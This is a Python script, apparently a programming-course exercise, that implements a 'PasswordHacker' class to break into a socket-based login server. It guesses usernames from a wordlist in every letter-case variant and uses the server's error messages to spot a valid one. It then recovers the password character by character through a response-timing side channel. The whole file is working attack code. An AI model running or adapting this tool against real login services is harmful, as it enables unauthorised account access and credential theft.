import itertools
import socket
import sys
import os
import json
from datetime import datetime


def parse_file(path, filename):
    file_path = os.path.join(path, filename)
    item_list = []
    with open(file_path) as fp:
        for line in fp:
            item_list.extend(line.split())
    return item_list


class PasswordHacker:

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.difference = 0

    def _convert_to_json(self, login, password):
        return json.dumps({'login': login, 'password': password}, indent=4)

    def _generate_case_combinations(self, word_list):
        combinations = []
        for word in word_list:
            combinations.extend(map(''.join, itertools.product(*((c.upper(), c.lower()) for c in word))))
        return combinations

    def check_login(self, socket, login, temp_pass=" "):
        message_as_json = self._convert_to_json(login, temp_pass)
        socket.send(message_as_json.encode())
        response = socket.recv(1024)
        resp = json.loads(response.decode())['result']
        return True if resp == 'Wrong password!' else False

    def guess_login(self, socket, path, filename_logins):
        common_logins = parse_file(path, filename_logins)
        logins = self._generate_case_combinations(common_logins)
        self.user_login = ""
        for login in logins:
            login = login.strip()
            if self.check_login(socket, login, " "):
                self.user_login = login
                return login
        return None

    def check_pass_timeout(self, socket, login, password):
        message_as_json = self._convert_to_json(login, password)
        sendTime = datetime.now()
        socket.send(message_as_json.encode())
        response = socket.recv(1024)
        receiveTime = datetime.now()
        self.difference = receiveTime - sendTime
        resp = json.loads(response.decode())['result']
        return True if resp == 'Connection success!' else False

    def guess_password(self, socket, path, filename_passwords):
        common_passwords = parse_file(path, filename_passwords)
        self.passwords = self._generate_case_combinations(common_passwords)
        password_try = ""
        for password in self.passwords:
            for char in password:
                if self.check_pass_timeout(socket, self.user_login, password_try + char):
                    return password_try + char
                elif self.difference.microseconds >= 1000:
                    password_try = password_try + char
                    break
        return None

    def get_login_details(self, address, path, filename_passwords, filename_logins):
        with socket.socket() as soc:
            soc.connect(address)
            user_login = self.guess_login(soc, path, filename_logins)
            user_pass = self.guess_password(soc, path, filename_passwords)
            return self._convert_to_json(user_login, user_pass)

def main():
    # read IP and PORT from command line
    ip, port = sys.argv[1:]
    address = (ip, int(port))

    path = os.path.realpath(os.path.join(os.getcwd(),
os.path.dirname(__file__)))
    filename_passwords = 'commonPass.txt'
    filename_logins = 'logins.txt'

    hacker = PasswordHacker(ip, port)
    print(hacker.get_login_details(address, path, filename_passwords,
filename_logins))


if __name__ == '__main__':
    main()
